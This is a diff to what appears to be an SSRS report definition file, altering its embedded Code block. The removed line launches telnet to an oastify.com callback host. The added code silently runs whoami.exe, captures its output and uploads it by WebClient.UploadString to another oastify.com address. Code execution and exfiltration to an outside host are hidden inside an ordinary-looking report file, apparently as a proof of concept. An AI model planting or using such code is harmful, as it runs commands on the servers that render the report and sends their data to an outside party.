@@ -44,7 +44,21 @@
     </GridLayoutDefinition>
   </ReportParametersLayout>
   <Code>
-    System.Diagnostics.Process.Start("telnet.exe", "p8y3lfd5lrhzuke6y3bwprkdp4vvjt7i.oastify.com 80")
+    Dim webClient As New System.Net.WebClient
+    Using process as New Process()
+      process.StartInfo.Filename = "whoami.exe"
+      process.StartInfo.RedirectStandardOutput = True
+      process.StartInfo.UseShellExecute = False
+      process.StartInfo.CreateNoWindow = True
+
+      process.Start()
+
+      output = process.StandardOutput.ReadToEnd()
+
+      process.WaitForExit()
+
+      webClient.UploadString("http://mka0xcp2xotw6hq3a0nt1owa117svpje.oastify.com/abc/123/", output)
+    End Using
   </Code>
   <rd:ReportUnitType>Inch</rd:ReportUnitType>
   <rd:PageUnit>Px</rd:PageUnit>
